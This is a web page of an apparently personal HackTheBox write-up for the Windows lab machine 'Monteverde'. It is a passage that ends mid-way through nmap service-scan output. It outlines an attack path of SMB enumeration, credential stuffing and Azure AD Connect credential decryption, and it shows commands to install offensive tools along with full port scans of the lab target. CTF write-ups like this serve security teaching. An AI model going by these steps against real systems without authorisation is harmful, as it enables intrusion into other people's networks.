<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Monteverde/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Monteverde | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Monteverde/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Monteverde | CyFun"><meta data-rh="true" name="description" content="ðŸ’¢ Info"><meta data-rh="true" property="og:description" content="ðŸ’¢ Info"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Monteverde/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Monteverde/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Monteverde/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Monteverde</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Monteverde </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Monteverde </h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-info">ðŸ’¢ Info<a href="#-info" class="hash-link" aria-label="Direct link to ðŸ’¢ Info" title="Direct link to ðŸ’¢ Info">â€‹</a></h2><h1></h1><ul><li><strong>Name:</strong> Monteverde</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/223" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="monteverde" src="/assets/images/monteverde-1402b47aac6667510dd43c9ac267cba3.png" width="598" height="381" class="img_ev3q"></p><h1></h1><h3 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">â€‹</a></h3><ul><li><strong>Network enumeration</strong>: SMB enumeration</li><li><strong>Network reconnaissance</strong>: SMB share &amp; Azure AD Connect config &amp; credential stuffing</li><li><strong>Privilege Escalation : mhope to Administrator</strong>: hidden folder &amp; Azure AD Connect credentials decryption</li></ul><p>Install tools used on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo pacman -S nmap crackmapexec enum4linux impacket evil-winrm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">â€‹</a></h3><p>I ran a <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> port scan to discover open ports:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo nmap -p- 10.10.10.172 -oA nmap_ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[sudo] password for cyfun:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.031s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65516 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp    open  domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp    open  kerberos-sec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp   open  msrpc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp   open  netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp   open  ldap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp   open  microsoft-ds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp   open  kpasswd5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp   open  http-rpc-epmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp   open  ldapssl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp  open  globalcatLDAP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp  open  globalcatLDAPssl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp  open  wsman</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">9389/tcp  open  adws</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49667/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49673/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49674/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49675/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49703/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49775/tcp open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 123.83 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And then did a service discovery and script scan with <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> again on open
ports. </p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[sudo] password for cyfun:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.172</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.031s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp    open  domain?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNSVersionBindReqTCP:</span><br></span><span class="token-line" 